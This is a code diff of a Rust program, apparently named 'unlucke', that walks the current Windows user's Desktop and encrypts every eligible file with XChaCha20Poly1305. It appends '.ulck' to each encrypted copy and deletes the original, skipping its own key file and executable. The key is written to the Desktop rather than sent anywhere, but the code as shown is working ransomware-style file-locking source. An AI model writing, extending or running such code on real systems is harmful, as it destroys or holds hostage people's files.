@@ -2,46 +2,72 @@
 
 use chacha20poly1305::{
     aead::{stream, KeyInit, OsRng},
-    XChaCha20Poly1305,
+    Key, XChaCha20Poly1305,
 };
-use rand::{distributions::Alphanumeric, RngCore};
-use rand::{thread_rng, Rng};
+use rand::RngCore;
 use std::{
     env,
-    fs::{self, File},
+    fs::{self, metadata, File},
     io::{self, Read, Write},
     thread,
 };
 
+static ENCRYPTED_EXTENSION: &str = ".ulck";
+static IGNORE_END: [&str; 4] = [
+    ENCRYPTED_EXTENSION,
+    "unlucke.key",
+    "unlucke.exe",
+    "desktop.ini",
+];
+static IGNORE_START: [&str; 1] = ["$"];
 static MAX_FILE_SIZE: u64 = 1000000000;
-static COOL_TEXT: &str = r#"  __    __  __    __  __        __    __   ______   __    __  ________
- /  |  /  |/  \  /  |/  |      /  |  /  | /      \ /  |  /  |/        |
- $$ |  $$ |$$  \ $$ |$$ |      $$ |  $$ |/$$$$$$  |$$ | /$$/ $$$$$$$$/
- $$ |  $$ |$$$  \$$ |$$ |      $$ |  $$ |$$ |  $$/ $$ |/$$/  $$ |__
- $$ |  $$ |$$$$  $$ |$$ |      $$ |  $$ |$$ |      $$  $$<   $$    |
- $$ |  $$ |$$ $$ $$ |$$ |      $$ |  $$ |$$ |   __ $$$$$  \  $$$$$/
- $$ \__$$ |$$ |$$$$ |$$ |_____ $$ \__$$ |$$ \__/  |$$ |$$  \ $$ |_____
- $$    $$/ $$ | $$$ |$$       |$$    $$/ $$    $$/ $$ | $$  |$$       |
-  $$$$$$/  $$/   $$/ $$$$$$$$/  $$$$$$/   $$$$$$/  $$/   $$/ $$$$$$$$/"#;
+static COOL_TEXT: &str = r#"    __    __  __    __  __        __    __   ______   __    __  ________
+   /  |  /  |/  \  /  |/  |      /  |  /  | /      \ /  |  /  |/        |
+   $$ |  $$ |$$  \ $$ |$$ |      $$ |  $$ |/$$$$$$  |$$ | /$$/ $$$$$$$$/
+   $$ |  $$ |$$$  \$$ |$$ |      $$ |  $$ |$$ |  $$/ $$ |/$$/  $$ |__
+   $$ |  $$ |$$$$  $$ |$$ |      $$ |  $$ |$$ |      $$  $$<   $$    |
+   $$ |  $$ |$$ $$ $$ |$$ |      $$ |  $$ |$$ |   __ $$$$$  \  $$$$$/
+   $$ \__$$ |$$ |$$$$ |$$ |_____ $$ \__$$ |$$ \__/  |$$ |$$  \ $$ |_____
+   $$    $$/ $$ | $$$ |$$       |$$    $$/ $$    $$/ $$ | $$  |$$       |
+    $$$$$$/  $$/   $$/ $$$$$$$$/  $$$$$$/   $$$$$$/  $$/   $$/ $$$$$$$$/"#;
 
-fn runFile(sourceFilePath: &str, key: &str) -> Result<(), io::Error> {
-    let metadata = File::open(sourceFilePath)?.metadata()?;
+fn runFile(sourceFilePath: &str, key: &Key) -> Result<(), io::Error> {
+    if sourceFilePath == "" {
+        return Ok(());
+    }
+
+    for ignore in IGNORE_START {
+        if sourceFilePath.starts_with(ignore) {
+            return Ok(());
+        }
+    }
+
+    for ignore in IGNORE_END {
+        if sourceFilePath.ends_with(ignore) {
+            return Ok(());
+        }
+    }
+
+    let mut sourceFile = File::open(sourceFilePath)?;
+    let metadata = sourceFile.metadata()?;
+
     if metadata.len() == 0 || metadata.len() > MAX_FILE_SIZE {
         return Ok(());
     }
 
-    let destinationFilePath = sourceFilePath.to_owned() + ".ulck";
+    println!("Encrypting file: {}", sourceFilePath);
 
-    let mut nonce = [0u8; 24];
+    let destinationFilePath = sourceFilePath.to_owned() + ENCRYPTED_EXTENSION;
+
+    let mut nonce = [0u8; 19];
     OsRng.fill_bytes(&mut nonce);
 
-    let aead = XChaCha20Poly1305::new(key.as_bytes().into());
+    let aead = XChaCha20Poly1305::new(key);
     let mut streamEncryptor = stream::EncryptorBE32::from_aead(aead, nonce.as_ref().into());
 
     const BUFFER_LEN: usize = 500;
     let mut buffer = [0u8; BUFFER_LEN];
 
-    let mut sourceFile = File::open(sourceFilePath)?;
     let mut distFile = File::create(destinationFilePath)?;
 
     loop {
@@ -70,16 +96,13 @@ fn runFile(sourceFilePath: &str, key: &str) -> Result<(), io::Error> {
         }
     }
 
+    fs::remove_file(sourceFilePath)?;
+
     Ok(())
 }
 
-fn runDirEntry(dirEntryPath: &str, key: &str) {
-    let dirEntry = match File::open(dirEntryPath) {
-        Ok(file) => file,
-        Err(_) => return,
-    };
-
-    let metadata = match dirEntry.metadata() {
+fn runDirEntry(dirEntryPath: &str, key: &Key) {
+    let metadata = match metadata(dirEntryPath) {
         Ok(metadata) => metadata,
         Err(_) => return,
     };
@@ -119,24 +142,27 @@ fn main() {
         Err(_) => panic!("No username set"),
     };
 
-    let key: String = thread_rng()
-        .sample_iter(&Alphanumeric)
-        .take(64)
-        .map(char::from)
-        .collect();
+    let key = XChaCha20Poly1305::generate_key(&mut OsRng);
 
     let mut entryPath: String = r#"C:\Users\"#.to_string();
     entryPath.push_str(&username);
+    entryPath.push_str(r#"\Desktop"#);
 
     println!("Entry point: {}", entryPath);
 
     let mut keyPath: String = entryPath.clone();
     keyPath.push_str(r#"\unlucke.key"#);
 
-    println!(r#"Writing key at {}. Key: {}"#, keyPath, key);
+    let existsAlready = metadata(&keyPath).is_ok();
+    if existsAlready {
+        panic!("Key already exists");
+    }
+
+    println!(r#"Writing key at {}"#, keyPath);
 
     let mut keyFile = File::create(&keyPath).unwrap();
-    keyFile.write_all(key.as_bytes()).unwrap();
+    keyFile.write_all(&key).unwrap();
+
     let dirEntries = fs::read_dir(&entryPath).unwrap();
     for dirEntry in dirEntries {
         match dirEntry {
